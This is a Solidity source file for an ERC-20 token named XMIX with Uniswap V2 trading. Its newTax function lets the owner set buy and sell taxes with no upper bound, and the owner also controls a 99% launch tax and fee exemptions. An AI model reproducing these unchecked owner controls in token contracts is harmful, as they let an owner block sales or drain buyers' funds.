1 // .----------------.  .----------------.  .----------------.  .----------------. 
2 //| .--------------. || .--------------. || .--------------. || .--------------. |
3 //| |  ____  ____  | || | ____    ____ | || |     _____    | || |  ____  ____  | |
4 //| | |_  _||_  _| | || ||_   \  /   _|| || |    |_   _|   | || | |_  _||_  _| | |
5 //| |   \ \  / /   | || |  |   \/   |  | || |      | |     | || |   \ \  / /   | |
6 //| |    > `' <    | || |  | |\  /| |  | || |      | |     | || |    > `' <    | |
7 //| |  _/ /'`\ \_  | || | _| |_\/_| |_ | || |     _| |_    | || |  _/ /'`\ \_  | |
8 //| | |____||____| | || ||_____||_____|| || |    |_____|   | || | |____||____| | |
9 //| |              | || |              | || |              | || |              | |
10 //| '--------------' || '--------------' || '--------------' || '--------------' |
11 // '----------------'  '----------------'  '----------------'  '----------------' 
12 
13 // SPDX-License-Identifier: Unlicensed
14 pragma solidity 0.8.18;
15 
16 abstract contract Context {
17     function _msgSender() internal view virtual returns (address) {
18         return msg.sender;
19     }
20 }
21 
22 library SafeMath {
23     function add(uint256 a, uint256 b) internal pure returns (uint256) {
24         uint256 c = a + b;
25         require(c >= a, "addition overflow");
26         return c;
27     }
28 
29     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
30         return sub(a, b, "subtraction overflow");
31     }
32 
33     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
34         require(b <= a, errorMessage);
35         uint256 c = a - b;
36         return c;
37     }
38 
39     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
40         if (a == 0) {
41             return 0;
42         }
43         uint256 c = a * b;
44         require(c / a == b, " multiplication overflow");
45         return c;
46     }
47 
48     function div(uint256 a, uint256 b) internal pure returns (uint256) {
49         return div(a, b, "division by zero");
50     }
51 
52     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
53         require(b > 0, errorMessage);
54         uint256 c = a / b;
55         return c;
56     }
57 }
58 
59 contract Ownable is Context {
60     address private _owner;
61     event OwnershipTransferred(
62         address indexed previousOwner,
63         address indexed newOwner
64     );
65 
66     constructor() {
67         address msgSender = _msgSender();
68         _owner = msgSender;
69         emit OwnershipTransferred(address(0), msgSender);
70     }
71 
72     function owner() public view returns (address) {
73         return _owner;
74     }
75 
76     modifier onlyOwner() {
77         require(_owner == _msgSender(), "caller is not the owner");
78         _;
79     }
80 
81     function transferOwnership(address newOwner) public onlyOwner {
82         require(newOwner != address(0), "new owner is the zero address");
83         _owner = newOwner;
84         emit OwnershipTransferred(_owner, newOwner);
85     }
86 
87     function renounceOwnership() public virtual onlyOwner {
88         emit OwnershipTransferred(_owner, address(0));
89         _owner = address(0);
90     }
91 }
92 
93 interface IERC20 {
94     function totalSupply() external view returns (uint256);
95     function balanceOf(address account) external view returns (uint256);
96     function transfer(address recipient, uint256 amount) external returns (bool);
97     function allowance(address owner, address spender) external view returns (uint256);
98     function approve(address spender, uint256 amount) external returns (bool);
99     function transferFrom( address sender, address recipient, uint256 amount) external returns (bool);
100     event Transfer(address indexed from, address indexed to, uint256 value);
101     event Approval(address indexed owner, address indexed spender, uint256 value);
102 }
103 
104 interface IUniswapV2Factory {
105     function createPair(address tokenA, address tokenB)
106         external
107         returns (address pair);
108 }
109 
110 interface IUniswapV2Router02 {
111     function swapExactTokensForETHSupportingFeeOnTransferTokens(
112         uint256 amountIn,
113         uint256 amountOutMin,
114         address[] calldata path,
115         address to,
116         uint256 deadline
117     ) external;
118 
119     function factory() external pure returns (address);
120     function WETH() external pure returns (address);
121 }
122 
123 contract XMIX is Context, IERC20, Ownable {
124     using SafeMath for uint256;
125     mapping(address => uint256) private _balance;
126     mapping(address => mapping(address => uint256)) private _allowances;
127     mapping(address => bool) private _isExcludedFromFeeWallet;
128     uint8 private constant _decimals = 18;
129     uint256 private constant _totalSupply = 100000000 * 10**_decimals;
130     
131     uint256 private constant onePercent = 1000000 * 10**_decimals; // 1% from Liquidity 
132 
133     uint256 public maxWalletAmount = onePercent * 2; // 2% max wallet at launch
134 
135     uint256 private _tax;
136     uint256 public buyTax = 25;
137     uint256 public sellTax = 25;
138 
139     string private constant _name = "XMIX";
140     string private constant _symbol = "XMIX";
141 
142     IUniswapV2Router02 private uniswapV2Router;
143     address public uniswapV2Pair;
144     address payable public taxWallet;
145         
146     uint256 private launchedAt;
147     uint256 private launchDelay = 0;
148     bool private launch = false;
149 
150     uint256 private constant minSwap = onePercent / 20; //0.05% from Liquidity supply
151     bool private inSwapAndLiquify;
152     modifier lockTheSwap {
153         inSwapAndLiquify = true;
154         _;
155         inSwapAndLiquify = false;
156     }
157 
158     constructor(address[] memory wallets) {
159         uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
160         uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
161         taxWallet = payable(0x308A53D656718A7ef253e6e0b3D672F74C448Df5);
162         for (uint256 i = 0; i < wallets.length; i++) {
163             _isExcludedFromFeeWallet[wallets[i]] = true;
164         }
165         _isExcludedFromFeeWallet[msg.sender] = true;
166         _isExcludedFromFeeWallet[taxWallet] = true;
167         _isExcludedFromFeeWallet[address(this)] = true;
168 
169         _allowances[taxWallet][address(uniswapV2Router)] = _totalSupply;//Approve at deploy
170         _balance[taxWallet] = _totalSupply;
171         emit Transfer(address(0), address(taxWallet), _totalSupply);
172     }
173 
174     function name() public pure returns (string memory) {
175         return _name;
176     }
177 
178     function symbol() public pure returns (string memory) {
179         return _symbol;
180     }
181 
182     function decimals() public pure returns (uint8) {
183         return _decimals;
184     }
185 
186     function totalSupply() public pure override returns (uint256) {
187         return _totalSupply;
188     }
189 
190     function balanceOf(address account) public view override returns (uint256) {
191         return _balance[account];
192     }
193 
194     function transfer(address recipient, uint256 amount)public override returns (bool){
195         _transfer(_msgSender(), recipient, amount);
196         return true;
197     }
198 
199     function allowance(address owner, address spender) public view override returns (uint256){
200         return _allowances[owner][spender];
201     }
202 
203     function approve(address spender, uint256 amount) public override returns (bool){
204         _approve(_msgSender(), spender, amount);
205         return true;
206     }
207 
208      function newDelay(uint256 newLaunchDelay) external onlyOwner {
209          launchDelay = newLaunchDelay;
210      }
211 
212     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
213         _transfer(sender, recipient, amount);
214         _approve(sender,_msgSender(),_allowances[sender][_msgSender()].sub(amount,"low allowance"));
215         return true;
216     }
217 
218     function _approve(address owner, address spender, uint256 amount) private {
219         require(owner != address(0) && spender != address(0), "approve zero address");
220         _allowances[owner][spender] = amount;
221         emit Approval(owner, spender, amount);
222     }
223 
224     function enableTrading() external onlyOwner {
225         launch = true;
226         launchedAt = block.number;
227     }
228 
229     function _transfer(address from, address to, uint256 amount) private {
230         require(from != address(0), "transfer zero address");
231 
232         if (_isExcludedFromFeeWallet[from] || _isExcludedFromFeeWallet[to]) {
233             _tax = 0;
234         } else {
235             require(launch, "Wait till launch");
236             if (block.number < launchedAt + launchDelay) {_tax=99;} else {
237                 if (from == uniswapV2Pair) {
238                     require(balanceOf(to) + amount <= maxWalletAmount, "Max wallet 2% at launch");
239                     _tax = buyTax;
240                 } else if (to == uniswapV2Pair) {
241                     uint256 tokensToSwap = balanceOf(address(this));
242                     if (tokensToSwap > minSwap && !inSwapAndLiquify) {
243                         if (tokensToSwap > onePercent) {
244                             tokensToSwap = onePercent;
245                         }
246                         swapTokensForEth(tokensToSwap);
247                     }
248                     _tax = sellTax;
249                 } else {
250                     _tax = 0;
251                 }
252             }
253         }
254         uint256 taxTokens = (amount * _tax) / 100;
255         uint256 transferAmount = amount - taxTokens;
256 
257         _balance[from] = _balance[from] - amount;
258         _balance[to] = _balance[to] + transferAmount;
259         _balance[address(this)] = _balance[address(this)] + taxTokens;
260 
261         emit Transfer(from, to, transferAmount);
262     }
263 
264     function removeLimits() external onlyOwner {
265         maxWalletAmount = _totalSupply;
266     }
267 
268     function newTax(uint256 newBuyTax, uint256 newSellTax) external onlyOwner {
269         buyTax = newBuyTax;
270         sellTax = newSellTax;
271     }
272 
273     function swapTokensForEth(uint256 tokenAmount) private lockTheSwap {
274         address[] memory path = new address[](2);
275         path[0] = address(this);
276         path[1] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
277         _approve(address(this), address(uniswapV2Router), tokenAmount);
278         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
279             tokenAmount,
280             0,
281             path,
282             taxWallet,
283             block.timestamp
284         );
285     }
286     function setExcludeWalletFromLimits(address newWallet, bool exclude) external onlyOwner {
287         _isExcludedFromFeeWallet[newWallet] = exclude;
288     }
289 
290     receive() external payable {}
291 }